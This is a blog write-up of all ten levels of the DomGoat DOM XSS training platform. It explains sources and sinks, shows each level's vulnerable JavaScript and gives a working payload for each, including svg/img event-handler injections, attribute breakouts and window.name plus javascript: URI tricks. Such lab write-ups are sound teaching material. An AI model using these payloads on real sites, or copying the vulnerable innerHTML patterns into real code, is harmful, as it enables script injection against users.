---
author: AnirudhAnand
layout: post
title: From 4 sources to 3 sinks in DOM XSS - DomGoat level 1-10 (all levels) writeup
categories:
- ctf
summary: DomGoat is a DOM Security learning platform written by Lava Kumar Kupan (from Ironwasp security) with different levels, each level targetting on different sources and sinks.
description: DomGoat is a DOM Security learning platform written by Lava Kumar Kupan (from Ironwasp security) with different levels, each level targetting on different sources and sinks.
---

## Introduction

According to [OWASP](https://www.owasp.org/index.php/DOM_Based_XSS){:target="_blank"}, DOM Based XSS is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner.

Now what does it mean? Before diving into an example, let’s look at what “sink” and “source” means:


### Source:

Source is the location from which untrusted data is taken by the application (which can be controlled by user input) and passed on to the sink. There are [4 different categories](https://domgo.at/cxss/sources/somevalue){:target="_blank"} of sources:



| URL-based Sources | Navigation-based Sources | Communication Sources | Storage Sources |
| :-----------------| :------------------------|:----------------------|:----------------|
| location          | window.name              | Ajax                  | Cookies         |
| location.href     | document.referrer        | Web Sockets           | localStorage    |
| location.search   |                          | Window Messaging      | SessionStorage  |
| location.pathname |                          |                       |                 |


See an example for all the sources at [DomGoat](https://domgo.at/cxss/sources/somevalue?param1=paramvalue#hashvalue){:target="_blank"}.



### Sink:

Sinks are the places where untrusted data coming from the sources is actually getting executed resulting in DOM XSS. There are 3 different categories of [sinks](https://domgo.at/cxss/sinks){:target="_blank"}:


| javaScript Execution Sinks | HTML Execution Sinks | javaScript URI Sinks |
|----------------------------|:---------------------|:---------------------|
| eval()                     | innerHTML()          | location             |
| setTimeout()               | outerHTML()          | location.href        |
| setInterval()              | document.write()     | location.replace()   |
| Function()                 |                      | location.assign()    |


See an example for all the sinks at [DomGoat](https://domgo.at/cxss/sinks){:target="_blank"}.


Confused ? let’s take an example to illustrate:
{% highlight html lineos %}
<html>
    <p id="name">Hello<p>
    <script>
        var url = new URL(window.location.href);
        var name = url.searchParams.get("name");
        document.getElementById('name').innerHTML = 'Hello ' + name;
    </script>
</html>
{%endhighlight%}

In the above example, you can see that the javaScript is searching a GET parameter called “name” and it's writing its value dynamically into the DOM using innerHTML. So its vulnerable to DOM xss: `name=<svg/onload=alert(1)>`

So here, location.href is the source (where the untrusted data is coming from) while innerHTML is the sink (where the payload actually executed).


### DomGoat

[DomGoat](https://domgo.at/cxss/example/1?payload=abcd&sp=x#12345){:target="_blank"} is a DOM Security learning platform written by Lava Kumar Kupan (from Ironwasp security) with different levels, each level targetting on different sources and sinks.


#### Level 1:

{% highlight javascript lineos %}
let hash = location.hash;
if (hash.length > 1) {
    let hashValueToUse = unescape(hash.substr(1));
    let msg = "Welcome <b>" + hashValueToUse + "</b>!!";
    document.getElementById("msgboard").innerHTML = msg;
}
{%endhighlight%}

**Sink**: innerHTML 

**Source**: location.hash 

**Solution**: `<svg/onload=alert(1)>` 

As always, level 1 starts with the easiest challenge. Here the `location.hash` is read and specifically unescaped (since modern browsers by default will urlencode the location.hash to avoid DOM XSS) and inserted into the div using **innerHTML**.


#### Level 2:

{% highlight javascript lineos %}
let rfr = document.referrer;
let paramValue = unescape(getPayloadParamValueFromUrl(rfr));
if (paramValue.length > 0) {
    let msg = "Welcome <b>" + paramValue + "</b>!!";
    document.getElementById("msgboard").innerHTML = msg;
} else {
    document.getElementById("msgboard").innerHTML = "Parameter named <b>payload</b> was not found in the referrer.";
}
{%endhighlight%}

If you look at the HTML source code, you can see the `getPayloadParamValueFromUrl()` defined which extracts the value of the GET parameter named **payload** if any:

{% highlight javascript lineos %}
let getPayloadParamValueFromUrl = function (url) {
let paramName = "payload=";
if (url.indexOf(paramName) > -1) {
    let part = url.substr(rfr.indexOf(paramName));
    part = part.split(paramName)[1];
    if (part.indexOf("#") > -1) {
        part = part.split("#")[0];
    }
    part = part.split("&")[0];
    return part;
}
return "";
};
{%endhighlight%}


**Sink**: innerHTML

**Source**: document.referrer

**Solution**: [https://domgo.at/cxss/example/1?payload=%3Csvg/onload=alert(1)%3E&sp=x#12345](https://domgo.at/cxss/example/1?payload=%3Csvg/onload=alert(1)%3E&sp=x#12345){:target="_blank"}

Here, the **payload** from the `document.referrer` is extracted and is written to the DOM using innerHTML. So you can visit the above URL first and then navigate to Example 2 link (payload param is set to actual XSS payload.)


#### Level 3:

{% highlight javascript lineos %}
let responseBody = xhr.responseText;
let responeBodyObject = JSON.parse(responseBody);
let msg = "Welcome <b>" + responeBodyObject.payload + "</b>!!";
document.getElementById("msgboard").innerHTML = msg;
{%endhighlight%}


**Sink**: innerHTML

**Source**: Ajax

**Solution**: `<img src=xx onerror=alert(1)>`

The response from the Ajax request (emulated with the user input) is parsed on the client side and is written directly to DOM with innerHTML.


#### Level 4:

{% highlight javascript lineos %}
let ws = new WebSocket(webSocketUrl);
ws.onmessage = function (evt) {
    
    let rawMsg = evt.data;
    let msgJson = JSON.parse(rawMsg);
    let msg = "Welcome <b>" + msgJson.payload + "</b>!!";
    document.getElementById("msgboard").innerHTML = msg;
};
{%endhighlight%}


**Sink**: innerHTML

**Source**: Web Sockets

**Solution**: `<img src=xx onerror=alert(1)>`

The web socket response (emulated with the user input) is parsed on the client side and is written directly to DOM with innerHTML.


#### Level 5:

{% highlight javascript lineos %}
window.onmessage = function (evt) {
    let msgObj = evt.data;
    let msg = "Welcome <b>" + msgObj.payload + "</b>!!";
    document.getElementById("msgboard").innerHTML = msg;
};
{%endhighlight%}


**Sink**: innerHTML

**Source**: Post message

**Solution**: `<img src=xx onerror=alert(1)>`

The HTML5 post message data (emulated with the user input) is parsed and written directly to DOM with innerHTML.


#### Level 6:

{% highlight javascript lineos %}
let payloadValue = localStorage.getItem("payload", payload);
let msg = "Welcome " + payload + "!!";
document.getElementById("msgboard").innerHTML = msg;
{%endhighlight%}


**Sink**: innerHTML

**Source**: localStorage

**Solution**: `<img src=xx onerror=alert(1)>`

The localStorage data (emulated with the user input) is parsed and written directly to DOM with innerHTML.


#### Level 7:

{% highlight javascript lineos %}
let hash = location.hash;
let hashValueToUse = hash.length > 1 ? unescape(hash.substr(1)) : hash;
hashValueToUse = hashValueToUse.replace(/</g, "&lt;").replace(/>/g, "&gt;");
let msg = "<a href='#user=" + hashValueToUse + "'>Welcome</a>!!";
document.getElementById("msgboard").innerHTML = msg;
{%endhighlight%}


**Sink**: innerHTML

**Source**: location.hash

**Solution**: `#'%20onmouseover=alert(1)//`

The location.hash is written directly into `href` tag without sanitization and hence we can inject a single quote and break out of the attribtue context to inject our own event handlers.


#### Level 8:

{% highlight javascript lineos %}
let hash = location.hash;
let hashValueToUse = hash.length > 1 ? unescape(hash.substr(1)) : hash;

if (hashValueToUse.indexOf("=") > -1 ) {
    hashValueToUse = hashValueToUse.substr(hashValueToUse.indexOf("=")+1);
    hashValueToUse = hashValueToUse.replace(/</g, "&lt;").replace(/>/g, "&gt;");
    let msg = "<a href='#user=" + hashValueToUse + "'>Welcome</a>!!";
    document.getElementById("msgboard").innerHTML = msg;
}
{%endhighlight%}


**Sink**: innerHTML

**Source**: location.hash

**Solution**: `#='%20onmouseover=alert(1)//`

A small difference between this and level 7 is that what ever comes after the first `=` character is written into the DOM as a part of href tag. Since we can't inject new tags, we can use event handlers to solve the challenge.



#### Level 9:

{% highlight javascript lineos %}
let hash = location.hash;
let hashValueToUse = hash.length > 1 ? unescape(hash.substr(1)) : hash;

if (hashValueToUse.indexOf("=") > -1 ) {
    
    hashValueToUse = hashValueToUse.substr(hashValueToUse.indexOf("=") + 1);
    
    if (hashValueToUse.length > 1) {
        hashValueToUse = hashValueToUse.substr(0, 10);
        hashValueToUse = hashValueToUse.replace(/"/g, "&quot;");
        let windowValueToUse = window.name.replace(/"/g, "&quot;");
        let msg = "<a href=\"" + hashValueToUse + windowValueToUse + "\">Welcome</a>!!";
        document.getElementById("msgboard").innerHTML = msg;
    }
}
{%endhighlight%}


**Sink**: innerHTML

**Source**: window.name + location.hash

**Solution**: 
{% highlight javascript lineos %}
<script>
var victim= window.open('https://domgo.at/cxss/example/9#user=javascript', ':alert(1)');
</script>
{%endhighlight%}


In this challenge, 2 values namely window.name and location.hash are combined (both can be attacker controlled) and is written to the DOM using innerHTML. In order to exploit this, we can host a custom HTML page with the above solution and visit it (which can control the window.name property and location.hash property together).



#### Level 10:

{% highlight javascript lineos %}
let urlParts = location.href.split("?");
if (urlParts.length > 1) {
    
    let queryString = urlParts[1];
    let queryParts = queryString.split("&");
    let userId = "";
    for (let i = 0; i < queryParts.length; i++) {
        
        let keyVal = queryParts[i].split("=");
        if (keyVal.length > 1) {
            if (keyVal[0] === "user") {
                
                userId = keyVal[1];
                break;
            }
        }
    }
    if (userId.startsWith("ID-")) {

        userId = userId.substr(3, 10);
        userId = userId.replace(/"/g, "&quot;");
        let windowValueToUse = window.name.replace(/"/g, "&quot;");
        let msg = "<a href=\"" + userId + windowValueToUse + "\">Welcome</a>!!";
        document.getElementById("msgboard").innerHTML = msg;
    }
}
{%endhighlight%}


**Sink**: innerHTML

**Source**: window.name + user (GET parameter)

**Solution**: 
{% highlight javascript lineos %}
<script>
var victim= window.open('https://domgo.at/cxss/example/10?lang=en&user=ID-javascript', ':alert(1)');
</script>
{%endhighlight%}

Here, the value of GET parameter `user` is extracted and written into the DOM along with the window.name property inside an href tag. Since we are dealing with URL context, we can inject `javascript:` URI just like the last challenge.


## Note

If you have a better way of solving the challenge (may be without any user interaction ?), do comment below, let's share and learn :)